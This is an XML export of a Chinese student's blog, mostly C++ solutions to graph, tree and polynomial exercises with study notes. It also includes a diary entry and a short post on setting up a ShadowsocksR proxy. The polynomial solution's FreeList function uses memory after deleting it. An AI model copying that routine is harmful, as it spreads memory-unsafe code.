[n]; for (int i = 0; i &lt; n; i++) &#123; dist[i] = inf; path[i] = -1; collected[i] = false; &#125; dist[s] = 0; collected[s] = true; node * ptr = G[s].next; while (ptr) &#123; if (!collected[ptr-&gt;element]) &#123; int w = ptr-&gt;element; if (dist[s]+ptr-&gt;weight&lt;dist[w]) &#123; dist[w] = dist[s] + ptr-&gt;weight; path[w] = s; &#125; &#125; ptr = ptr-&gt;next; &#125; while (true) &#123; int min = inf, v = -1; for (int i = 0; i &lt; n; i++) &#123; if (!collected[i] &amp;&amp; dist[i]!=-1 &amp;&amp; dist[i]&lt;min) &#123; min = dist[i]; v = i; &#125; &#125; if (min==inf || v&lt;0) break; collected[v] = true; node * ptr = G[v].next; while (ptr) &#123; if (!collected[ptr-&gt;element]) &#123; int w = ptr-&gt;element; if (dist[v]+ptr-&gt;weight&lt;dist[w]) &#123; dist[w] = dist[v] + ptr-&gt;weight; path[w] = v; &#125; &#125; ptr = ptr-&gt;next; &#125; &#125; int min = -1; for (int i = 0; i &lt; n; i++) &#123; if (dist[i]==inf) return -1; if (dist[i]&gt;min) min = dist[i]; &#125; delete [] dist; delete [] path; delete [] collected; return min;&#125;]]></content>
      <tags>
        <tag>数据结构与算法题目集（中文）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7-7 六度空间]]></title>
    <url>%2F2018%2F08%2F15%2FDS-7-7%2F</url>
    <content type="text"><![CDATA[预备知识 六度空间理论：社交关系图中，任一两个节点总可以在六步之内相互关联。 题目描述用深度优先搜索一幅图的每一个节点相对于其他所有节点满足六度空间理论的百分率。 思路用上次写的邻接表表示的图，基本没什么多的操作，就是控制一下BFS的层数就结束了。 难点没有难点 体会与感想 在Clion中调试的时候，想看new出来的一片连续空间时，需要在new watch中添加命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175- c++想要控制输出固定位小数时，先用fixed固定好小数点，在用setprecesion控制保留几位小数- setprecesion本来是用来控制有效数字的# 源代码```C++#include &lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;struct node &#123; int element; node * next;&#125;;struct Queue &#123; int * queue; int head; int tail; int size;&#125;;node * createGraph(int n);void readGraph(node * G, int e);int BFSvalid(node * G, int i, int n);void deleteGraph(node * G, int n);int main(int argc, char const *argv[]) &#123; freopen(&quot;D:\\SJTU\\Freshman Summer\\DS\\test.txt&quot;, &quot;r&quot;, stdin); int n, m;cin &gt;&gt; n &gt;&gt; m; node * G = createGraph(n); readGraph(G,m); for (int i = 0; i &lt; n; i++) &#123; int valid = BFSvalid(G,i,n); double percentage = valid / (double)n; cout &lt;&lt; i + 1 &lt;&lt; &quot;: &quot;; cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; 100 * percentage; cout &lt;&lt; &apos;%&apos; &lt;&lt; endl; &#125; deleteGraph(G,n); return 0;&#125;int findMin(node * ptr, bool * visited) &#123; int min; while (ptr-&gt;next &amp;&amp; visited[ptr-&gt;next-&gt;element]) &#123; ptr = ptr-&gt;next; &#125; if (ptr-&gt;next==NULL) return -1; else min = ptr-&gt;next-&gt;element; ptr = ptr-&gt;next-&gt;next; while (ptr) &#123; if (ptr-&gt;element&lt;min &amp;&amp; !visited[ptr-&gt;element]) &#123; min = ptr-&gt;element; &#125; ptr = ptr-&gt;next; &#125; return min;&#125;bool remains(node * ptr, bool * visited) &#123; while (ptr-&gt;next) &#123; if (!visited[ptr-&gt;next-&gt;element]) &#123; return true; &#125; ptr = ptr-&gt;next; &#125; return false;&#125;Queue * creatQueue(int n) &#123; Queue * q = new Queue; q-&gt;size = n; q-&gt;queue = new int [n]; q-&gt;head = 0; q-&gt;tail = -1; return q;&#125;void deleteQueue(Queue * q) &#123; delete [] q-&gt;queue; delete q;&#125;void enQueue(Queue * q, int element) &#123; q-&gt;queue[++q-&gt;tail] = element;&#125;int deQueue(Queue * q) &#123; return q-&gt;queue[q-&gt;head++];&#125;void push(Queue * q, node * ptr, bool * visited, int * cnt) &#123; while (remains(ptr,visited)) &#123; int min = findMin(ptr,visited); if (min==-1) return; enQueue(q,min); (*cnt)++; visited[min] = true; &#125;&#125;int BFSvalid(node * G, int start, int n) &#123; //return the number of valid nodes Queue * q = creatQueue(n); //of the BFS of node i bool * visited = new bool [n]; for (int i = 0; i &lt; n; i++) &#123; visited[i] = false; &#125; int cnt = 1, degree = 6; enQueue(q,start); visited[start] = true; int sentry = q-&gt;tail; while (q-&gt;head!=q-&gt;tail+1 &amp;&amp; degree&gt;0) &#123; while (q-&gt;head!=sentry+1) &#123; int popelement = deQueue(q); push(q,&amp;G[popelement],visited,&amp;cnt); &#125; sentry = q-&gt;tail; degree--; &#125; delete [] visited; deleteQueue(q); return cnt;&#125;void deleteGraph(node * G, int n) &#123; for (int i = 0; i &lt; n; i++) &#123; node * ptr = G[i].next; while (ptr) &#123; node * temp = ptr-&gt;next; delete ptr; ptr = temp; &#125; &#125; delete [] G;&#125;void insertEdge(node * G, int i, int j) &#123; node * ptr = &amp;G[i]; while (ptr-&gt;next) &#123; ptr = ptr-&gt;next; &#125; ptr-&gt;next = new node; ptr = ptr-&gt;next; ptr-&gt;element = j; ptr-&gt;next = NULL; ptr = &amp;G[j]; while (ptr-&gt;next) &#123; ptr = ptr-&gt;next; &#125; ptr-&gt;next = new node; ptr = ptr-&gt;next; ptr-&gt;element = i; ptr-&gt;next = NULL;&#125;void readGraph(node * G, int e) &#123; int vi, vj; for (int i = 0; i &lt; e; i++) &#123; cin &gt;&gt; vi &gt;&gt; vj; insertEdge(G, vi-1, vj-1); &#125;&#125;node * createGraph(int n) &#123; node * G = new node [n]; for (int i = 0; i &lt; n; i++) &#123; G[i].element = i; G[i].next = NULL; &#125; return G;&#125;]]></content>
      <tags>
        <tag>数据结构与算法题目集（中文）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7-6 列出连通集]]></title>
    <url>%2F2018%2F08%2F14%2FDS-7-6%2F</url>
    <content type="text"><![CDATA[预备知识 图 多对多的关系 无向边（u v） 有向边 线性表 一对一 树 一对多 抽象数据类型定义的三要 类型名称 数据对象集 操作集 网络 带权重的图 图的表示方法取决于你要解决的具体问题 DFS 深度优先搜索 出栈 DFS 时间复杂度取决于图的表示方法 领接表 O(N+E) 邻接矩阵 O(N^2) BFS 广度优先 DFS BFS 复杂度相同 广优的话，占内存多，能找到最优解，必须遍历所有分枝. 广优的一个应用就是迪科斯彻单元最短路径算法. 深优的话，占内存少，能找到最优解（一定条件下），但能很快找到接近解（优点），可能不必遍历所有分枝（也就是速度快）, 深优的一个应用就是连连看游戏. 连通分量 一次DFS 遍历了一个连通分量 题目描述分别用深度优先搜索和广度优先搜索遍历一幅图的所有节点。 思路首先就是考虑这个图该用领接表还是邻接矩阵来表示，后来在码代码的过程中发现确实是邻接矩阵方便的多，不用findmin函数。但我没用过邻接表，这次练习一下。 难点基本没有难点 体会与感想 大工程绝对不要企图用一个.cpp文件就想写完，太天真了。 果然写的太长了是因为我太菜了嘛 半天200行的效率 反复传图指针很难受 还没来得及看视频 源代码 这次的代码比较长，放一个文件里也比较乱 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191#include &lt;iostream&gt;using namespace std;struct node &#123; int element; node * next;&#125;;struct Queue &#123; int * queue; int head; int tail; int size;&#125;;node * createGraph(int n);void readGraph(node * G, int e);void DFSlistComponents(node * G, int n);void deleteGraph(node * G, int n);void BFSlistComponents(node * G, int n);int main(int argc, char const *argv[]) &#123; freopen("D:\\SJTU\\Freshman Summer\\DS\\test.txt", "r", stdin); int n, e;cin &gt;&gt; n &gt;&gt; e; node * G = createGraph(n); readGraph(G,e); DFSlistComponents(G,n); BFSlistComponents(G,n); deleteGraph(G,n); return 0;&#125;int findMin(node * ptr, bool * visited) &#123; int min; while (ptr-&gt;next &amp;&amp; visited[ptr-&gt;next-&gt;element]) &#123; ptr = ptr-&gt;next; &#125; if (ptr-&gt;next==NULL) return -1; else min = ptr-&gt;next-&gt;element; ptr = ptr-&gt;next-&gt;next; while (ptr) &#123; if (ptr-&gt;element&lt;min &amp;&amp; !visited[ptr-&gt;element]) &#123; min = ptr-&gt;element; &#125; ptr = ptr-&gt;next; &#125; return min;&#125;bool remains(node * ptr, bool * visited) &#123; while (ptr-&gt;next) &#123; if (!visited[ptr-&gt;next-&gt;element]) &#123; return true; &#125; ptr = ptr-&gt;next; &#125; return false;&#125;Queue * creatQueue(int n) &#123; Queue * q = new Queue; q-&gt;size = n; q-&gt;queue = new int [n]; q-&gt;head = 0; q-&gt;tail = -1; return q;&#125;void deleteQueue(Queue * q) &#123; delete [] q-&gt;queue; delete q;&#125;void enQueue(Queue * q, int element) &#123; q-&gt;queue[++q-&gt;tail] = element;&#125;int deQueue(Queue * q) &#123; return q-&gt;queue[q-&gt;head++];&#125;void push(Queue * q, node * ptr, bool * visited) &#123; while (remains(ptr,visited)) &#123; int min = findMin(ptr,visited); if (min==-1) return; enQueue(q,min); visited[min] = true; &#125;&#125;void BFSlistComponents(node * G, int n) &#123; Queue * q = creatQueue(n); bool * visited = new bool [n]; for (int i = 0; i &lt; n; i++) &#123; visited[i] = false; &#125; for (int i = 0; i &lt; n; i++) &#123; if (!visited[i]) &#123; cout &lt;&lt; "&#123; "; enQueue(q,i); visited[i] = true; while (q-&gt;head!=q-&gt;tail+1) &#123; int popelement = deQueue(q); cout &lt;&lt; popelement &lt;&lt;" "; push(q,&amp;G[popelement],visited); &#125; cout &lt;&lt; '&#125;' &lt;&lt; endl; &#125; &#125; delete [] visited; deleteQueue(q);&#125;void DFS(node * G, int i, bool * visited) &#123; while (remains(&amp;G[i],visited)) &#123; int min = findMin(&amp;G[i],visited); if (min==-1) return; cout &lt;&lt; min &lt;&lt;" "; visited[min] = true; DFS(G,min,visited); &#125;&#125;void DFSlistComponents(node * G, int n) &#123; bool * visited = new bool [n]; for (int i = 0; i &lt; n; i++) &#123; visited[i] = false; &#125; for (int i = 0; i &lt; n; i++) &#123; if (visited[i]) continue; cout &lt;&lt; "&#123; "; if (!visited[i]) &#123; cout &lt;&lt; i &lt;&lt;" "; visited[i] = true; DFS(G,i,visited); &#125; cout &lt;&lt; "&#125;" &lt;&lt; endl; &#125; delete [] visited;&#125;void deleteGraph(node * G, int n) &#123; for (int i = 0; i &lt; n; i++) &#123; node * ptr = G[i].next; while (ptr) &#123; node * temp = ptr-&gt;next; delete ptr; ptr = temp; &#125; &#125; delete [] G;&#125;void insertEdge(node * G, int i, int j) &#123; node * ptr = &amp;G[i]; while (ptr-&gt;next) &#123; ptr = ptr-&gt;next; &#125; ptr-&gt;next = new node; ptr = ptr-&gt;next; ptr-&gt;element = j; ptr-&gt;next = NULL; ptr = &amp;G[j]; while (ptr-&gt;next) &#123; ptr = ptr-&gt;next; &#125; ptr-&gt;next = new node; ptr = ptr-&gt;next; ptr-&gt;element = i; ptr-&gt;next = NULL;&#125;void readGraph(node * G, int e) &#123; int vi, vj; for (int i = 0; i &lt; e; i++) &#123; cin &gt;&gt; vi &gt;&gt; vj; insertEdge(G, vi, vj); &#125;&#125;node * createGraph(int n) &#123; node * G = new node [n]; for (int i = 0; i &lt; n; i++) &#123; G[i].element = i; G[i].next = NULL; &#125; return G;&#125;]]></content>
      <tags>
        <tag>数据结构与算法题目集（中文）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自搭梯子翻越GFW]]></title>
    <url>%2F2018%2F08%2F12%2FGFW%2F</url>
    <content type="text"><![CDATA[主要借鉴 十分钟搭建自己的科学上网SSR梯子非常感谢！ 思路 首先你得先租借好专用的VPS，推荐的有Digitalocean和Vultr 我先是试了试Singapore的服务器发现很慢，于是换了LA的，爽的不行。 然后就是在登陆服务器之后通过rrsmu.sh脚本安装ShadowsocksR 最后在自己的客户端装上SSR 奇迹就这样发生了]]></content>
  </entry>
  <entry>
    <title><![CDATA[7-4 是否同一棵二叉搜索树]]></title>
    <url>%2F2018%2F08%2F12%2FDS-7-4%2F</url>
    <content type="text"><![CDATA[题目描述判断给定的插入序列是否构成同一棵二叉搜索树 （二叉搜索树：所有左子树元素都小于自身，所有右子树元素都大于自身） 输入12345678984 23 1 4 23 4 1 23 2 4 12 12 11 20 输出123YesNoNo 思路判断数列的奇淫技巧，测试点1过不了。 哈哈现在我的奇淫技巧过了。 更新了根据即将插入的根进行判断。 难点选择比较的方法以及原始数据和比较数据的储存形式 体会与感想自己写的代码多看几遍总归是能看懂的，理清楚的。 还有很想说的是cmake不支持中文以及文件名中的空格，以后再也不用中文了。 真的，实在是..所有中文一律乱码 看了视频之后再写真的是畅通无比，一次提交直接AC。 膜递归… 源代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;iostream&gt;using namespace std;void comparetree(int n, int l);int main(int argc, char const *argv[]) &#123; freopen("D:\\SJTU\\Freshman Summer\\DS\\test.txt", "r", stdin); while (true) &#123; int n;cin&gt;&gt;n; if (n==0) break; int l;cin&gt;&gt;l; comparetree(n,l); &#125; return 0;&#125;void print(bool same)&#123; switch (same) &#123; case true: cout &lt;&lt; "Yes" &lt;&lt; endl;break; case false:cout &lt;&lt; "No" &lt;&lt; endl;break; &#125;&#125;void comparetree(int n, int l)&#123; int * src = new int [n]; //src--the original array int * select = new int [n]; //select 0--&gt;not added to the cmp tree for (size_t i = 0; i &lt; n; i++) cin &gt;&gt; src[i]; //select 1--&gt;added to the cmp tree int * cmp = new int [n]; for (size_t i = 0; i &lt; l; i++) &#123; bool same = true; for (size_t i = 0; i &lt; n; i++) &#123;cin &gt;&gt; cmp[i];select[i]=0;&#125; if (src[0]!=cmp[0]) &#123; //judge the head same = false; print(same); continue; &#125;else select[0] = 1; for (size_t i = 1; i &lt; n &amp;&amp; same; i++) &#123; //i--indecate the cmp node int rootcmp = src[0]; for (size_t k = 1; k &lt; n; k++) &#123; if (src[k]&gt;rootcmp&amp;&amp;select[k]==1&amp;&amp;cmp[i]&gt;rootcmp) &#123; rootcmp = src[k]; &#125;else if (src[k]&lt;rootcmp&amp;&amp;select[k]==1&amp;&amp;cmp[i]&lt;rootcmp) &#123; rootcmp = src[k]; &#125; &#125; for (size_t j = 1; j &lt; n; j++) &#123; if (select[j]==1) continue; if (cmp[i]==src[j]) &#123; select[j] = 1; break; &#125; int rootsrc = src[0]; for (size_t k = 1; k &lt; j; k++) &#123; if (src[k]&gt;rootsrc&amp;&amp;src[j]&gt;rootsrc) &#123; rootsrc = src[k]; &#125;else if (src[k]&lt;rootsrc&amp;&amp;src[j]&lt;rootsrc) &#123; rootsrc = src[k]; &#125; &#125; if (rootcmp==rootsrc) &#123; if (cmp[i]&gt;rootcmp&amp;&amp;src[j]&gt;rootsrc&amp;&amp;cmp[i]!=src[j]) &#123; same = false; print(same); break; &#125; if (cmp[i]&lt;rootcmp&amp;&amp;src[j]&lt;rootsrc&amp;&amp;cmp[i]!=src[j]) &#123; same = false; print(same); break; &#125; &#125; &#125; &#125; if (same) print(same); &#125;&#125; 顺便再贴一下看了视频之后的源码结构更加清晰 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;iostream&gt;using namespace std;struct node &#123; int value; node * left; node * right; int select;&#125;;node * maketree(int n);void deletetree(node * tree);bool treecmp(node * tree, int n);int main(int argc, char const *argv[]) &#123; freopen("D:\\SJTU\\Freshman Summer\\DS\\test.txt", "r", stdin); int n;cin &gt;&gt; n; while (n) &#123; int l;cin &gt;&gt; l; node * tree = maketree(n); for (int i = 0; i &lt; l; i++) &#123; if (treecmp(tree,n)) cout &lt;&lt; "Yes" &lt;&lt; endl; else cout &lt;&lt; "No" &lt;&lt; endl; &#125; deletetree(tree); cin &gt;&gt; n; &#125; return 0;&#125;bool check(node * tree, int v)&#123; if (!tree) return false; if (tree-&gt;value==v) &#123; tree-&gt;select = 1; return true; &#125; if (tree-&gt;select==0) &#123; return false; &#125; if (tree-&gt;value&gt;v) &#123; return check(tree-&gt;left,v); &#125;else&#123; return check(tree-&gt;right,v); &#125;&#125;void settree(node * tree)&#123; if (!tree) return; if (tree-&gt;left) settree(tree-&gt;left) ; if (tree-&gt;right) settree(tree-&gt;right); tree-&gt;select = 0;&#125;bool treecmp(node * tree, int n)&#123; settree(tree); int v; bool ret = true; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; v; if (!check(tree,v)) ret = false; &#125; return ret;&#125;void deletetree(node * tree)&#123; if (!tree) return; if (tree-&gt;left) deletetree(tree-&gt;left) ; if (tree-&gt;right) deletetree(tree-&gt;right); delete tree;&#125;node * newnode(int value)&#123; node * treenode = new node; treenode-&gt;left = NULL ; treenode-&gt;right = NULL ; treenode-&gt;value = value ; treenode-&gt;select = 0 ; return treenode;&#125;node * attachnode(node * tree, int value)&#123; if (!tree) &#123; return newnode(value); &#125;else&#123; if (tree-&gt;value&gt;value) tree-&gt;left = attachnode(tree-&gt;left ,value); else tree-&gt;right= attachnode(tree-&gt;right,value); return tree; &#125;&#125;node * maketree(int n)&#123; int value; node * tree = NULL; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; value; tree = attachnode(tree,value); &#125; return tree;&#125;]]></content>
      <tags>
        <tag>数据结构与算法题目集（中文）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7-3 树的同构]]></title>
    <url>%2F2018%2F08%2F11%2FDS-7-3%2F</url>
    <content type="text"><![CDATA[题目描述判断给出的两棵树是否是同构的（同构-即左右子树可以相互交换位置） 输入1234567891011121314151617188A 1 2B 3 4C 5 -D - -E 6 -G 7 -F - -H - -8G - 4B 7 6F - -A 5 1H - -C 0 -D - -E 2 - 输出1Yes 思路刚开始听了MOOC上说用静态链表（简单来说就是数组，只不过每个元素带有指针效果的元素）后这么想的：读入需要两个inArray，再根据这两个Array构造两个满二叉树的char型数组，然后用递归写一个cmp在满二叉树的char型数组上比较。实在太麻烦了。 然后就用了MOOC上的方法。搞了全局变量，简直不要太舒服。 最后一个边界条件（n=0）引起的段错误调的我ooxx 难点怎么组织你的数据，就像老师讲的： 你打算怎么储存两棵树 怎么找到根节点（这个简单） 怎么比较同构1和3我现在都还是无法驾驭。1是熟练掌握数据结构的应用，3是写递归程序。 体会与感想深深地体会到了大神的代码和我自己的代码之间的区别（100+行都写不完和60行AC的差距）orz 当你函数的参数≥四个并且还是在反复传同一个参数的时候，你就该想想你的思路是不是不太对了。 有时候全局变量该用就得用，否则到时候难受的是你自己。 main函数里东西越少越好，代码质量越高，可读性越好。 递归函数感觉还是比较虚，边界条件有时理不清。 尽可能地检查边界条件（极小与极大）。 源代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;#define max 10#define null -1using namespace std;struct node &#123; char element; int left; int right;&#125;tree1[max], tree2[max];int build(node * tree);bool isomorphic(int r1, int r2);int main(int argc, char const *argv[]) &#123; freopen("D:\\SJTU\\Freshman Summer\\DS\\test.txt", "r", stdin); int r1 = 0, r2 = 0; r1 = build(tree1); r2 = build(tree2); if (r1!=-1 &amp;&amp; r2!=-1) &#123; if (isomorphic(r1,r2)) cout &lt;&lt; "Yes"; else cout &lt;&lt; "No"; &#125;else if (r1==-1 &amp;&amp; r2==-1) &#123; cout &lt;&lt; "Yes"; &#125;else cout &lt;&lt; "No"; return 0;&#125;bool isomorphic(int r1, int r2)&#123; if (r1==null &amp;&amp; r2==null) return true; if (r1==null || r2==null) return false; int n1 = 0, n2 = 0; if (tree1[r1].left==null) n1++; if (tree1[r1].right==null) n1++; if (tree2[r2].left==null) n2++; if (tree2[r2].right==null) n2++; if (n1!=n2) return false; if (tree1[r1].element!=tree2[r2].element) return false; if (n1==2) return true; else if (n1==1) &#123; if (tree1[r1].left==null&amp;&amp;tree2[r2].left==null) &#123; return isomorphic(tree1[r1].right,tree2[r2].right); &#125; else if (tree1[r1].left==null&amp;&amp;tree2[r2].right==null) &#123; return isomorphic(tree1[r1].right,tree2[r2].left); &#125; else if (tree1[r1].right==null&amp;&amp;tree2[r2].left==null) &#123; return isomorphic(tree1[r1].left,tree2[r2].right); &#125; else if (tree1[r1].right==null&amp;&amp;tree2[r2].right==null) &#123; return isomorphic(tree1[r1].left,tree2[r2].left); &#125; &#125; else if (n1==0) &#123; if (tree1[tree1[r1].left].element==tree2[tree2[r2].left].element) &#123; return isomorphic(tree1[r1].left,tree2[r2].left) &amp;&amp; isomorphic(tree1[r1].right,tree2[r2].right); &#125;else&#123; return isomorphic(tree1[r1].left,tree2[r2].right) &amp;&amp; isomorphic(tree1[r1].right,tree2[r2].left); &#125; &#125; return true;&#125;int build(node * tree)&#123; int n;cin &gt;&gt; n; if (n==0) return -1; int * select = new int [n]; char le, ri; for (int i = 0; i &lt; n; i++) select[i] = 0; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; tree[i].element &gt;&gt; le &gt;&gt; ri; if (le!='-') &#123; tree[i].left = le - '0'; select[tree[i].left] = 1; &#125;else tree[i].left = null; if (ri!='-') &#123; tree[i].right = ri - '0'; select[tree[i].right] = 1; &#125;else tree[i].right = null; &#125; int ret = 0; for (int i = 0; i &lt; n; i++) &#123; if (select[i]==0) &#123; ret = i; break; &#125; &#125; delete [] select; return ret;&#125;]]></content>
      <tags>
        <tag>数据结构与算法题目集（中文）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小学期结束了，假期开始了]]></title>
    <url>%2F2018%2F07%2F27%2FSummerSemesterEnd%2F</url>
    <content type="text"><![CDATA[离别昨天傍晚阿阳一家就已经接他回江苏了，今早阿可一个人很早就出发了，中午的时候，阿韬的爸妈也来接他回江苏了。寝室里的人一个个地减少，最后，现在只剩下我了。 宿舍里的生气渐渐变少，阳台上晒着的衣服一件件地被不同的人收了进来，带回了家，阳台变得一干二净。上铺的床被搬空，书架上的书被带回了家，书桌被收拾的干干净净。窗外的蝉叫的更响亮了。 离别的气息充斥。 我一个人默默地考完最后一场考试，从东上院走出来。路上没有什么人，整个校园安安静静，仿佛整个世界只剩下闷热的空气。 孤独是一种常态吧，是嘛？ 我曾经不停地希望着中午回到寝室他们能不要吵，让我安安静静地再看一会儿书。 人可真是奇怪的动物，哈哈。 QQ也已经聊得很少了，在学期里明明是不想过多地去了解别人的消息，可是现在却热切地渴望着掌握别人的动态。 起航这个假期我准备干些什么呢？ 我想准备GRE，复习数据结构，看js书，多多做一些家务，多学一些日常本领。 还想预习一下下学期的电学基础课，多看一些文学书。 想保证一个健康的作息。]]></content>
      <tags>
        <tag>Freshman-Summer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7-2 一元多项式的乘法与加法运算]]></title>
    <url>%2F2018%2F07%2F18%2FDS-7-2%2F</url>
    <content type="text"><![CDATA[题目描述设计函数分别求两个一元多项式的乘积与和。 输入124 3 4 -5 2 6 1 -2 03 5 20 -7 4 3 1 输出1215 24 -25 22 30 21 -10 20 -21 8 35 6 -33 5 14 4 -15 3 18 2 -6 15 20 -4 4 -5 2 9 1 -2 0 思路首先要确定多项式的储存结构，决定用链表按照指数递降顺序存储。 接下来无非就是两个难题，一个是怎么加，一个是怎么乘。 难点一开始的时候我乘法用了我现在用的加法算法在一个个向后推，可以说是相当的蠢萌了。 加法标准做法是3个循环搞定，第一轮循环两个链表同时向后推，一个推到最后就把另一个剩下的全接上去就可以了。 乘法有很多种做法，我用了老师讲的插入法。 两轮循环，每一次都要向已有的链表上插入一个新的点，有时需要合并，有时需要删点。 源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197#include &lt;iostream&gt;using namespace std;const int MAX = 1003;struct node&#123; int coef;//系数 int expo;//指数 node * next;&#125;;node * CreatList(node * head); //单链表的读入与创建void PrintList(node * head); //输出以head为头结点的链表node * MultiplyList(node * p1, node *p2); //多项式乘法void Attach(int coef, int expo, node **nodepointer); //插入一个节点至nodepointer后node * AddList(node * p1, node *p2); //多项式加法void FreeList(node * p); //内存释放int main(int argc, char const *argv[]) &#123; node *head1 = NULL, *head2 = NULL; head1 = CreatList(head1); head2 = CreatList(head2); node *multi = MultiplyList(head1, head2); node *add = AddList(head1, head2); PrintList(multi);cout &lt;&lt; endl; PrintList(add); FreeList(head1);FreeList(head2);FreeList(multi);FreeList(add); return 0;&#125;node * CreatList(node * head)&#123; int coef, expo, k; node * p; head = new node; cin &gt;&gt; k; if ( !k ) return NULL; cin &gt;&gt; coef &gt;&gt; expo; head-&gt;coef = coef; head-&gt;expo = expo; head-&gt;next = NULL; p = head; for (size_t i = 1; i &lt; k; i++) &#123; cin &gt;&gt; coef &gt;&gt; expo; node *temp = new node; p-&gt;next = temp; temp-&gt;coef = coef; temp-&gt;expo = expo; temp-&gt;next = NULL; p = temp; &#125; return head;&#125;void PrintList(node * head)&#123; if ( !head ) &#123; cout &lt;&lt; "0 0"; &#125; while ( head ) &#123; cout &lt;&lt; head-&gt;coef &lt;&lt; " " &lt;&lt; head-&gt;expo; head = head-&gt;next; if ( head ) cout &lt;&lt; " "; &#125;&#125;//by inserting to the right place 2 loopsnode * MultiplyList(node * p1, node *p2)//p is the pointor&#123; //poining to the current node node *head = new node; head-&gt;expo = MAX; head-&gt;next = NULL; while ( p1 ) &#123; node *p = p2; while ( p ) &#123; //PrintList(head-&gt;next); //cout &lt;&lt; endl &lt;&lt; endl; int coef = p1-&gt;coef * p-&gt;coef; int expo = p1-&gt;expo + p-&gt;expo; node *temp = head; while ( true ) &#123; //point to one in front // cout &lt;&lt; "once "; if ( !(temp-&gt;next) || temp-&gt;next-&gt;expo&lt;=expo ) break; temp = temp-&gt;next; &#125; //now temp points to the insert place ahead // cout &lt;&lt; "now expo is " &lt;&lt; expo; // cout &lt;&lt; "my temp-&gt;expo = " &lt;&lt; temp-&gt;expo &lt;&lt; endl; if ( temp-&gt;next &amp;&amp; temp-&gt;next-&gt;expo == expo ) &#123; if ( temp-&gt;next-&gt;coef + coef == 0 ) &#123; //delete node * tobefreed = temp-&gt;next; temp-&gt;next = tobefreed-&gt;next; delete tobefreed; &#125;else &#123; //join together temp-&gt;next-&gt;coef += coef; &#125; &#125;else Attach(coef, expo, &amp;temp); p = p-&gt;next; &#125; p1 = p1-&gt;next; &#125; node * tobedeleted = head; head = head-&gt;next; delete tobedeleted; return head;&#125;void Attach(int coef, int expo, node **nodepointer)&#123; // cout &lt;&lt; "now coef=" &lt;&lt; coef &lt;&lt; " expo=" &lt;&lt; expo &lt;&lt; // " inserted after expo=" &lt;&lt; (*nodepointer)-&gt;expo &lt;&lt; endl; node * temp = new node; temp-&gt;coef = coef; temp-&gt;expo = expo; temp-&gt;next = (*nodepointer)-&gt;next; (*nodepointer)-&gt;next = temp;//here // cout &lt;&lt; "now temp-&gt;next=" &lt;&lt; temp-&gt;next; // cout &lt;&lt; " *nodepointer points to expo" &lt;&lt; (*nodepointer)-&gt;expo;&#125;node * AddList(node * p1, node *p2) //receive 2 pointers and return the AddList&#123; //head is a pointer to the head node node * p, * head; head = new node; //head is a head noder contains p = head; //nothing but a next pointor head-&gt;coef = 0; head-&gt;expo = 0; head-&gt;next = NULL; while ( p1 &amp;&amp; p2 ) &#123; int expo1, expo2; expo1 = p1-&gt;expo; expo2 = p2-&gt;expo; if ( expo1 &gt; expo2 ) &#123;//copy p-&gt;next = new node; p = p-&gt;next; p-&gt;next = NULL; p-&gt;expo = p1-&gt;expo; p-&gt;coef = p1-&gt;coef; p1 = p1-&gt;next; &#125;else if ( expo1 &lt; expo2 ) &#123; p-&gt;next = new node; p = p-&gt;next; p-&gt;next = NULL; p-&gt;expo = p2-&gt;expo; p-&gt;coef = p2-&gt;coef; p2 = p2-&gt;next; &#125;else &#123; int coef = p1-&gt;coef + p2-&gt;coef; if ( coef ) &#123; p-&gt;next = new node; p = p-&gt;next; p-&gt;next = NULL; p-&gt;expo = p1-&gt;expo; p-&gt;coef = coef; &#125; p1 = p1-&gt;next; p2 = p2-&gt;next; &#125; &#125; while ( p2 ) &#123; p-&gt;next = new node; p = p-&gt;next; p-&gt;next = NULL; p-&gt;expo = p2-&gt;expo; p-&gt;coef = p2-&gt;coef; p2 = p2-&gt;next; &#125; while ( p1 ) &#123; p-&gt;next = new node; p = p-&gt;next; p-&gt;next = NULL; p-&gt;expo = p1-&gt;expo; p-&gt;coef = p1-&gt;coef; p1 = p1-&gt;next; &#125; //cout &lt;&lt; head-&gt;next; p = head; head = head-&gt;next; delete p; return head; // if ( head-&gt;next ) &#123; // &#125;else &#123; // return head; // &#125;&#125;void FreeList(node * p)&#123; node * next; while ( p ) &#123; next = p-&gt;next; delete p; p = p-&gt;next; &#125;&#125;/*程序最后的两个细节问题1- 当加法结果为零时的输出2- 当有一个k为零时的输出*/]]></content>
      <tags>
        <tag>数据结构与算法题目集（中文）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PAT-A-1051]]></title>
    <url>%2F2018%2F05%2F07%2FPAT-A-1051%2F</url>
